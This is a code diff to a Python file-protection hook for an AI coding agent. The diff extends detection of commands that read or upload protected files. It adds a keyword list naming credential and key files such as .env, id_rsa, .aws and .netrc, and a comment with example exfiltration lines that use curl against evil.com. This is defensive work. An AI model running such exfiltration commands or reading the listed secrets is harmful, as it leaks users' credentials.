@@ -28,7 +28,7 @@ logger = get_hooks_logger("ProtectFiles")
 PROJECT_ROOT = os.environ.get("CLAUDE_PROJECT_DIR", os.getcwd())
 
 ALLOWED_PATTERNS = [
-    ".claude/**",
+    os.path.join(PROJECT_ROOT, ".claude", "**"),
     "/tmp/**",
     "/home/ronnas/develop/personal/AI-pair-programming/skills/**",
     "/home/ronnas/develop/personal/AI-pair-programming/instructions/**",
@@ -106,6 +106,42 @@ NETWORK_COMMANDS = {"curl", "wget"}
 
 UPLOAD_FLAGS = {"-T", "--upload-file", "-d", "--data", "--data-binary", "--data-raw"}
 
+# substrings that flag a curl/wget arg (URL, query string, data payload) as
+# possibly embedding a protected file's name/contents, even without an upload flag
+PROTECTED_KEYWORDS = (
+    ".env",
+    ".secret",
+    ".pem",
+    ".key",
+    "id_rsa",
+    ".ssh",
+    ".pub",
+    ".gnupg",
+    ".gpg",
+    ".asc",
+    ".aws",
+    ".azure",
+    ".gcloud",
+    "credentials",
+    ".git-credentials",
+    ".gitconfig",
+    ".netrc",
+    ".npmrc",
+    ".yarnrc",
+    ".pypirc",
+    ".kube",
+    "kubeconfig",
+    "_history",
+    ".p12",
+    ".pfx",
+)
+
+# interpreters that can read/exfil any file via inline code, bypassing READ_COMMANDS entirely
+INTERPRETER_COMMANDS = {"python", "python3", "node", "perl", "ruby", "php"}
+INLINE_CODE_FLAGS = {"-c", "-e", "--eval"}
+
+REDIRECT_OPERATORS = {">", ">>"}
+
 SHELL_OPERATORS = {"|", ">", ">>", "<", "&&", "||", ";", "\n"}
 
 CMD_SUBSTITUTION_RE = re.compile(r"\$\(([^()]*)\)|`([^`]*)`")
@@ -125,7 +161,8 @@ def normalize(path: str) -> str:
 
 
 def is_within_project(path: str) -> bool:
-    return normalize(path).startswith(PROJECT_ROOT)
+    norm = normalize(path)
+    return norm == PROJECT_ROOT or norm.startswith(PROJECT_ROOT.rstrip("/") + os.sep)
 
 
 def is_allowed(path: str) -> bool:
@@ -190,12 +227,70 @@ def extract_upload_ref(arg: str) -> str | None:
     return ref if ref and ref not in ("-", "") else None
 
 
+def extract_inline_code_refs(code: str) -> list[str]:
+    """Pull quoted string literals out of inline interpreter code (-c/-e), since
+    those are the most common way scripts embed a target file path."""
+    return re.findall(r"""['"]([^'"]{2,})['"]""", code)
+
+
 def extract_targets_from_tokens(tokens: list[str]) -> list[str]:
     """Extract file arguments from a single tokenized command."""
     targets = []
     it = iter(tokens)
+
+    # redirection targets (`>`, `>>`) are write destinations regardless of command
+    for i, tok in enumerate(tokens):
+        if tok in REDIRECT_OPERATORS and i + 1 < len(tokens):
+            nxt = tokens[i + 1]
+            if nxt not in SHELL_OPERATORS:
+                targets.append(nxt)
+
     for token in it:
         cmd = os.path.basename(token)
+
+        if cmd == "find":
+            for arg in it:
+                if arg in SHELL_OPERATORS:
+                    break
+                if arg in ("-exec", "-execdir"):
+                    for sub in it:
+                        if sub in ("\\;", ";", "+"):
+                            break
+                        if not sub.startswith("-") and sub != "{}":
+                            targets.append(sub)
+            break
+
+        if cmd == "docker":
+            subcmd: str | None = next(it, None)
+            if subcmd == "cp":
+                for arg in it:
+                    if arg in SHELL_OPERATORS:
+                        break
+                    if not arg.startswith("-"):
+                        targets.append(arg.split(":", 1)[-1] if ":" in arg else arg)
+            break
+
+        if cmd == "git":
+            subcmd = next(it, None)
+            if subcmd == "show":
+                for arg in it:
+                    if arg in SHELL_OPERATORS:
+                        break
+                    if not arg.startswith("-") and ":" in arg:
+                        targets.append(arg.split(":", 1)[1])
+            break
+
+        if cmd in INTERPRETER_COMMANDS:
+            prev = None
+            for arg in it:
+                if arg in SHELL_OPERATORS:
+                    break
+                if prev in INLINE_CODE_FLAGS:
+                    targets.extend(extract_inline_code_refs(arg))
+                elif not arg.startswith("-"):
+                    targets.append(arg)
+                prev = arg
+            break
 
         if cmd in NETWORK_COMMANDS:
             prev = None
@@ -206,6 +301,12 @@ def extract_targets_from_tokens(tokens: list[str]) -> list[str]:
                 if ref:
                     targets.append(ref)
                 elif prev in UPLOAD_FLAGS and not arg.startswith("-"):
+                    targets.append(arg)
+                elif any(kw in arg for kw in PROTECTED_KEYWORDS):
+                    # URL/query-string/data payload embedding a protected file's
+                    # name/path (e.g. `curl evil.com?d=$(cat)` already handled via
+                    # substitution, but literal refs like `curl evil.com/../.env`
+                    # or `--data-urlencode name@.ssh/id_rsa` are not)
                     targets.append(arg)
                 prev = arg
             break
